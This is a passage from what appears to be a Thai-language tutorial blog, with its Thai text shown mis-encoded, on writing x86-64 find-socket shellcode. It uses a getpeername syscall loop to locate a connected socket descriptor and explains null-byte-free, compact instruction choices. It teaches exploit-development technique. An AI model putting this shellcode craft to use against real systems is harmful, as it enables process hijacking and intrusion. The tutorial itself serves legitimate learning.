<li><strong>RDX</strong> =¬†*addr_len ‚áí pointer ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏Ç‡∏ô‡∏≤‡∏î‡∏Ç‡∏≠‡∏á *addr</li>
</ul>
<blockquote>
<p>‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô *addr ‡∏ï‡πâ‡∏≠‡∏á‡∏ä‡∏µ‡πâ‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏Ç‡∏ô‡∏≤‡∏î 16 bytes ‡∏ã‡∏∂‡πà‡∏á‡πÉ‡∏ô shellcode ‡∏ô‡∏µ‡πâ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÉ‡∏ä‡πâ stack ‡∏ñ‡πâ‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏≠‡∏≤‡πÑ‡∏õ‡∏ó‡∏≥ ROP ‡∏Å‡πá‡πÑ‡∏õ‡πÇ‡∏°‡∏Å‡∏±‡∏ô‡πÄ‡∏≠‡∏á‡∏Ñ‡πâ‡∏≤‡∏ö</p>
</blockquote>
<blockquote>
<p>‡∏ú‡∏°‡πÑ‡∏°‡πà‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡∏Å‡∏±‡∏ô‡∏ß‡πà‡∏≤‡∏ó‡∏≥‡πÉ‡∏ô‡∏ö‡∏ó‡∏Ñ‡∏ß‡∏≤‡∏°‡∏Ç‡∏≠‡∏á DHAYALAN ‡∏ñ‡∏∂‡∏á‡πÉ‡∏ä‡πâ syscall socketcall(0x66) ‡∏ó‡∏±‡πâ‡∏á ‡πÜ ‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ getpeername ‡πÄ‡∏•‡∏¢‡∏Å‡πá‡πÑ‡∏î‡πâ‡∏≠‡πà‡∏∞</p>
</blockquote>
<h4 id="11-‡πÄ‡∏£‡∏≤‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏ï‡∏£‡∏¢‡∏°‡∏û‡∏ß‡∏Å-argument-‡∏ï‡∏≤‡∏á-‡πÜ-‡∏Å‡∏≠‡∏ô‡πÄ‡∏•‡∏¢‡∏ã‡∏á‡∏à‡∏∞‡πÄ‡∏Ç‡∏¢‡∏ô‡πÑ‡∏î‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô">1.1 ‡πÄ‡∏£‡∏≤‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡∏û‡∏ß‡∏Å argument ‡∏ï‡πà‡∏≤‡∏á ‡πÜ ‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏•‡∏¢‡∏ã‡∏∂‡πà‡∏á‡∏à‡∏∞‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏î‡πâ‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ</h4>
<p>‡∏Å‡∏≥‡∏´‡∏ô‡∏î‡∏Ñ‡πà‡∏≤ rdx ‡πÅ‡∏•‡∏∞ rdi ‡πÉ‡∏´‡πâ‡πÄ‡∏õ‡πá‡∏ô 0 ‡∏Å‡πà‡∏≠‡∏ô ‡∏õ‡∏Å‡∏ï‡∏¥‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏£‡∏≤‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô shellcode ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡πÉ‡∏´‡πâ‡∏Ñ‡πà‡∏≤ register ‡∏ï‡∏±‡∏ß‡πÑ‡∏´‡∏ô‡πÄ‡∏õ‡πá‡∏ô 0 ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÄ‡∏≠‡∏≤‡∏ï‡∏±‡∏ß‡∏ô‡∏±‡πâ‡∏ô xor ‡∏Å‡∏±‡∏ö‡∏ï‡∏±‡∏ß‡∏°‡∏±‡∏ô‡πÄ‡∏≠‡∏á ‡πÄ‡∏û‡∏£‡∏≤‡∏∞ $x$ $\oplus$ $x$ = 0
‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÉ‡∏ä‡πâ <code>xor rdi, rdi</code> ‡∏Å‡πá‡πÑ‡∏î‡πâ ‡πÅ‡∏ï‡πà‡∏ô‡∏¥‡∏™‡∏±‡∏¢‡∏™‡πà‡∏ß‡∏ô‡∏ï‡∏±‡∏ß‡∏ú‡∏°‡∏ä‡∏≠‡∏ö <code>mov</code> ‡∏à‡∏≤‡∏Å‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô 0 ‡∏°‡∏≤‡∏Å‡∏Å‡∏ß‡πà‡∏≤‡∏Ñ‡πâ‡∏≤‡∏ö ‡πÉ‡∏Ñ‡∏£‡∏ñ‡∏ô‡∏±‡∏î‡πÅ‡∏ö‡∏ö‡πÑ‡∏´‡∏ô‡∏Å‡πá‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô ‡πÜ ‡πÑ‡∏õ‡πÄ‡∏ñ‡∏≠‡∏∞‡πÑ‡∏°‡πà‡∏ß‡πà‡∏≤‡∏Å‡∏±‡∏ô‡∏Ñ‡πâ‡∏≤‡∏ö</p>
<pre><code class="language-nasm">; Clear Register
xor rdx, rdx        ; rdx = 0
mov rdi, rdx        ; rdi = 0
</code></pre>
<p>‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏≠‡πà‡∏≤‡∏ô Manual ‡πÄ‡∏£‡∏≤‡∏£‡∏π‡πâ‡∏ß‡πà‡∏≤‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£ addr ‡πÄ‡∏õ‡πá‡∏ô pointer ‡∏Ç‡∏≠‡∏á struct ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó sockaddr ‡∏ã‡∏∂‡πà‡∏á‡∏°‡∏µ‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏≤‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ</p>
<pre><code class="language-c">struct sockaddr {
   unsigned short   sa_family;      // 2 bytes
   char             sa_data[14];    // 14 bytes
};
</code></pre>
<p>‡∏à‡∏≤‡∏Å struct ‡∏Ç‡πâ‡∏≤‡∏á‡∏ï‡πâ‡∏ô‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î 16 bytes ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏Ç‡∏≠‡∏á‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£ addr</p>
<p>‡πÄ‡∏£‡∏≤‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ <code>push rdx</code> ‡∏ã‡∏∂‡πà‡∏á‡∏°‡∏µ‡∏Ñ‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô 0 ‡∏•‡∏á‡πÑ‡∏õ‡πÉ‡∏ô stack 2 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ö‡∏ô Intel x86-64 ‡∏Å‡∏≤‡∏£ push ‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏à‡∏∞‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏•‡∏ö‡∏Ñ‡πà‡∏≤ rsp ‡πÑ‡∏õ 8 (rsp = rsp - 8) ‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏¢‡πâ‡∏≤‡∏¢‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á rsp ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡πÄ‡∏Å‡πá‡∏ö‡∏ó‡∏µ‡πà rsi</p>
<pre><code class="language-nasm">	; rsi = *addr
	push rdx            ; prep stack for *addr
	push rdx            ; prep stack for *addr
	mov rsi, rsp        ; rsi = *addr
</code></pre>
<p>‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ stack ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏≤‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ</p>
<pre><code>&lt;      Low Addr      &gt;
[        ....        ]
[ 0x0000000000000000 ]    &lt;- rsp, rsi
[ 0x0000000000000000 ]    
[ 0x0000000000c0ffee ]    &lt;- rsp ‡∏Å‡πà‡∏≠‡∏ô push 2 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á
[        ....        ]
&lt;      High Addr     &gt;
</code></pre>
<p>‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ rsi ‡∏Å‡πá‡πÑ‡∏î‡πâ‡πÄ‡∏Å‡πá‡∏ö pointer ‡∏ó‡∏µ‡πà‡∏ä‡∏µ‡πâ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡πÑ‡∏ß‡πâ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£ addr ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß</p>
<p>‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ dl (byte ‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á rdx) ‡πÄ‡∏õ‡πá‡∏ô 16 ‡∏ã‡∏∂‡πà‡∏á‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡∏ô‡∏≤‡∏î‡∏Ç‡∏≠‡∏á <code>struct sockaddr</code> ‡∏ô‡∏±‡πà‡∏ô‡πÄ‡∏≠‡∏á ‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ <code>push rdx</code> ‡∏•‡∏á‡πÑ‡∏õ‡πÉ‡∏ô stack ‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏¢‡πâ‡∏≤‡∏¢‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á rsp ‡πÑ‡∏õ‡πÄ‡∏Å‡πá‡∏ö‡πÉ‡∏ô rdx</p>
<pre><code class="language-nasm">	; rdx = *addr_len
	mov dl, 16          ; addr_len = 16
	push rdx            ; push addr_len to stack
	mov rdx, rsp        ; rdi = *addr_len
	[...]
</code></pre>
<p>‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ stack ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏≤‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ</p>
<pre><code>&lt;      Low Addr      &gt;
[        ....        ]
[ 0x0000000000000010 ]    &lt;- rdx, rsp
[ 0x0000000000000000 ]    &lt;- rsi
[ 0x0000000000000000 ]    
[ 0x0000000000c0ffee ]     
[        ....        ]
&lt;      High Addr     &gt;
</code></pre>
<p>‡∏Ç‡∏≠‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö dl ‡∏ô‡∏¥‡∏î‡∏ô‡∏∂‡∏á ‡πÉ‡∏´‡πâ‡πÅ‡∏¢‡∏Å‡∏¢‡πà‡∏≠‡∏¢‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏£‡∏π‡∏õ‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ ‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤ dl ‡∏Ñ‡∏∑‡∏≠ byte ‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á rdx ‡∏ô‡∏±‡πà‡∏ô‡πÄ‡∏≠‡∏á</p>
<pre><code>[...........rdx..........]  8 bytes
            [....edx.....]  4 bytes ‡∏ó‡πâ‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á rdx
                  [..dx..]  2 bytes ‡∏ó‡πâ‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á edx
                  [dh][dl]
                   dh 1 byte ‡πÅ‡∏£‡∏Å‡∏Ç‡∏≠‡∏á dx
                   dl 1 byte ‡∏ó‡πâ‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á dx
</code></pre>
<p>‡∏≠‡πà‡∏≤‡∏ô‡∏°‡∏≤‡∏ñ‡∏∂‡∏á‡∏ï‡∏£‡∏á‡∏ô‡∏µ‡πâ‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏ö‡∏≤‡∏á‡∏Ñ‡∏ô‡∏°‡∏µ‡∏Ñ‡∏≥‡∏ñ‡∏≤‡∏°‡∏ß‡πà‡∏≤‡∏ó‡∏≥‡πÑ‡∏°‡πÑ‡∏°‡πà <code>mov rdx, 16</code> ‡πÑ‡∏õ‡πÄ‡∏•‡∏¢‡∏ó‡∏≥‡πÑ‡∏°‡∏ï‡πâ‡∏≠‡∏á‡∏°‡∏≤ <code>mov dl, 16</code> ‡∏î‡πâ‡∏ß‡∏¢
‡∏Ñ‡∏≥‡∏ï‡∏≠‡∏ö‡∏Ç‡∏≠‡∏á‡∏Ç‡πâ‡∏≠‡∏ô‡∏µ‡πâ‡∏á‡πà‡∏≤‡∏¢‡∏°‡∏≤‡∏Å‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏´‡πá‡∏ô opcode ‡∏Ç‡∏≠‡∏á Assembly ‡∏Ç‡∏≠‡∏á‡∏ó‡∏±‡πâ‡∏á‡∏™‡∏≠‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ô‡∏µ‡πâ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ assembler ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß ‡∏•‡∏≠‡∏á‡∏î‡∏π‡∏ô‡∏µ‡πà‡∏ô‡∏∞‡∏Ñ‡πâ‡∏≤‡∏ö</p>
<pre><code class="language-nasm">0:  48 c7 c2 10 00 00 00    mov    rdx,0x10
</code></pre>
<pre><code class="language-nasm">0:  b2 10                   mov    dl,0x10
</code></pre>
<p>‡πÄ‡∏´‡πá‡∏ô‡∏≠‡∏∞‡πÑ‡∏£‡∏°‡∏±‡πâ‡∏¢‡∏Ñ‡∏£‡∏±‡∏ö ‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤ <code>mov rdx, 16</code> ‡∏°‡∏±‡∏ô‡∏à‡∏∞‡∏°‡∏µ null ‡πÉ‡∏ô opcode ‡∏î‡πâ‡∏ß‡∏¢‡∏≠‡∏µ‡∏Å‡∏ó‡∏±‡πâ‡∏á‡∏¢‡∏±‡∏á‡∏¢‡∏≤‡∏ß 7 bytes ‡πÅ‡∏ï‡πà‡∏Å‡∏•‡∏±‡∏ö‡∏Å‡∏±‡∏ô <code>mov dl, 16</code> ‡∏ô‡∏±‡πâ‡∏ô‡πÑ‡∏°‡πà‡∏°‡∏µ null ‡πÉ‡∏ô opcode ‡πÅ‡∏•‡∏∞‡∏¢‡∏±‡∏á‡∏¢‡∏≤‡∏ß‡πÄ‡∏û‡∏µ‡∏¢‡∏á‡πÅ‡∏Ñ‡πà 2 bytes ‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô</p>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Ñ‡∏≥‡∏ô‡∏∂‡∏á‡πÄ‡∏™‡∏°‡∏≠‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Assembly ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏≠‡∏≤‡πÑ‡∏õ‡∏ó‡∏≥ shellcode ‡∏ô‡∏±‡πâ‡∏ô‡∏´‡∏•‡∏±‡∏Å ‡πÜ ‡∏°‡∏µ 2 ‡∏≠‡∏¢‡πà‡∏≤‡∏á</p>
<ol>
<li>null byte ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡∏≠‡∏≤‡∏à‡πÑ‡∏õ‡∏ó‡∏≥‡πÉ‡∏´‡πâ shellcode ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡∏Ç‡∏≤‡∏î‡πÑ‡∏î‡πâ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ö‡∏≤‡∏á‡∏ï‡∏±‡∏ß‡∏≠‡∏≤‡∏à‡∏ï‡∏±‡∏î input ‡∏ó‡∏µ‡πà null byte ‡πÄ‡∏ä‡πà‡∏ô strcpy, strcat</li>
<li>‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß‡∏Ç‡∏≠‡∏á shellcode ‡πÄ‡∏ô‡∏∑‡πà‡∏≠‡∏á‡∏à‡∏≤‡∏Å‡∏ö‡∏≤‡∏á‡∏ó‡∏µ‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏™‡πà shellcode ‡πÑ‡∏î‡πâ‡∏ô‡∏±‡πâ‡∏ô‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏â‡∏ô‡∏±‡πâ‡∏ô‡∏¢‡∏¥‡πà‡∏á‡πÄ‡∏£‡∏≤‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏™‡∏±‡πâ‡∏ô‡πÑ‡∏î‡πâ‡πÄ‡∏ó‡πà‡∏≤‡πÑ‡∏£‡∏¢‡∏¥‡πà‡∏á‡∏î‡∏µ</li>
</ol>
<p><em>‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏ö‡∏≤‡∏á‡∏Ñ‡∏ô‡∏ó‡∏µ‡πà‡∏û‡∏∂‡πà‡∏á‡∏´‡∏±‡∏î‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô Assembly ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏õ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô shellcode ‡∏≠‡∏≤‡∏à‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏à‡∏≤‡∏Å‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÉ‡∏´‡πâ‡∏ñ‡∏π‡∏Å‡∏Å‡πà‡∏≠‡∏ô ‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡∏Ñ‡πà‡∏≠‡∏¢‡∏°‡∏≤‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ‡∏°‡∏µ null byte ‡πÅ‡∏•‡∏∞‡∏°‡∏µ‡∏Ç‡∏ô‡∏≤‡∏î‡∏™‡∏±‡πâ‡∏ô‡∏•‡∏á‡πÉ‡∏ô‡∏†‡∏≤‡∏¢‡∏´‡∏•‡∏±‡∏á ‡πÅ‡∏ï‡πà‡∏Ñ‡∏ô‡πÄ‡∏ó‡πà ‡πÜ ‡πÅ‡∏ö‡∏ö‡∏ú‡∏°‡πÄ‡∏Å‡πà‡∏á‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏õ optimize ‡πÑ‡∏õ‡πÑ‡∏î‡πâ‡πÄ‡∏•‡∏¢ üòé (‡∏´‡∏¢‡∏≠‡∏Å ‡πÜ)</em></p>
<p>‡∏û‡∏≠ ‡πÜ ‡πÇ‡∏°‡πâ‡∏°‡∏≤‡πÄ‡∏¢‡∏≠‡∏∞‡πÅ‡∏•‡∏∞ ‡∏Å‡∏•‡∏±‡∏ö‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤ shellcode ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡∏î‡∏µ‡∏Å‡∏ß‡πà‡∏≤‡∏Ñ‡πâ‡∏≤‡∏ö ‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ argument ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô getpeername ‡πÄ‡∏£‡∏≤‡∏û‡∏£‡πâ‡∏≠‡∏°‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß</p>
<h4 id="12-‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏£‡∏¢‡∏Å-getpeername-‡∏ú‡∏≤‡∏ô-syscall">1.2 ‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏£‡∏µ‡∏¢‡∏Å getpeername ‡∏ú‡πà‡∏≤‡∏ô Syscall</h4>
<p>‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ label ‡∏ä‡∏∑‡πà‡∏≠ loop_findfd ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£ <code>jmp</code> ‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ loop ‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô ‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡πà‡∏≤ rdi ‡∏Ç‡∏∂‡πâ‡∏ô 1 (‡∏ï‡∏≠‡∏ô‡πÅ‡∏£‡∏Å‡∏°‡∏µ‡∏Ñ‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô 0) ‡∏ô‡∏±‡πà‡∏ô‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ß‡πà‡∏≤‡∏Ñ‡πà‡∏≤ rdi ‡∏ã‡∏∂‡πà‡∏á‡πÄ‡∏õ‡πá‡∏ô‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£ sockfd ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏™‡πà‡∏á‡∏Ñ‡πà‡∏≤‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡πÉ‡∏ô‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô getpeername ‡∏à‡∏∞‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡∏∂‡πâ‡∏ô‡∏ó‡∏∏‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ loop ‡∏ô‡∏±‡πà‡∏ô‡πÄ‡∏≠‡∏á</p>
<pre><code class="language-nasm">; syscall getpeername
    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every time when we loop
</code></pre>
<p>‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡∏±‡πâ‡∏ô‡∏Å‡πá‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ rax ‡πÄ‡∏õ‡πá‡∏ô 0x34 (‡∏à‡∏∞‡πÉ‡∏™‡πà‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏•‡∏Ç‡∏ê‡∏≤‡∏ô 10 ‡∏´‡∏£‡∏∑‡∏≠ 16 ‡∏Å‡πá‡πÑ‡∏î‡πâ‡πÅ‡∏•‡πâ‡∏ß‡πÅ‡∏ï‡πà‡∏ñ‡∏ô‡∏±‡∏î) ‡∏•‡∏±‡∏Å‡∏©‡∏ì‡∏∞‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô‡∏Å‡∏±‡∏ö‡∏Å‡πà‡∏≠‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏ô‡∏±‡πà‡∏ô‡πÄ‡∏≠‡∏á</p>
<pre><code class="language-nasm">    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername
</code></pre>
<h4 id="13-‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏Ñ‡∏≤-rax-‡πÄ‡∏û‡∏≠‡∏´‡∏≤-sockfd">1.3 ‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏Ñ‡πà‡∏≤ rax ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤ sockfd</h4>
<p>‡πÇ‡∏î‡∏¢‡∏õ‡∏Å‡∏ï‡∏¥‡πÅ‡∏•‡πâ‡∏ß‡∏ö‡∏ô Intel x86-64 ‡πÄ‡∏ß‡∏•‡∏≤ system call ‡∏Ñ‡∏∑‡∏ô‡∏Ñ‡πà‡∏≤‡∏à‡∏∞‡∏™‡πà‡∏á‡∏≠‡∏≠‡∏Å‡∏°‡∏≤‡∏ú‡πà‡∏≤‡∏ô rax ‡∏ã‡∏∂‡πà‡∏á syscall ‡∏Ç‡∏≠‡∏á getpeername ‡∏Å‡πá‡πÄ‡∏ä‡πà‡∏ô‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô</p>
<p>‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡πÑ‡∏î‡πâ‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡πÑ‡∏ß‡πâ‡∏ï‡∏≠‡∏ô‡∏≠‡πà‡∏≤‡∏ô man-page ‡∏ß‡πà‡∏≤‡∏´‡∏≤‡∏Å‡πÄ‡∏à‡∏≠ FD ‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô sockfd ‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡∏à‡∏∞‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏õ‡πá‡∏ô 0 (rax = 0) ‡∏ô‡∏±‡πà‡∏ô‡πÄ‡∏≠‡∏á</p>
<p>‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ó‡∏≥‡∏Ñ‡∏∑‡∏≠‡πÄ‡∏£‡∏≤‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á <code>test rax, rax</code> ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö <a href="https://en.wikipedia.org/wiki/TEST_(x86_instruction)#:~:text=In%20the%20x86%20assembly%20language,while%20AF%20flag%20is%20undefined.">‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á test ‡∏î‡∏π‡πÑ‡∏î‡πâ‡∏ó‡∏µ‡πà‡∏ô‡∏µ‡πà</a> ‡πÉ‡∏´‡πâ‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡πÄ‡∏£‡πá‡∏ß 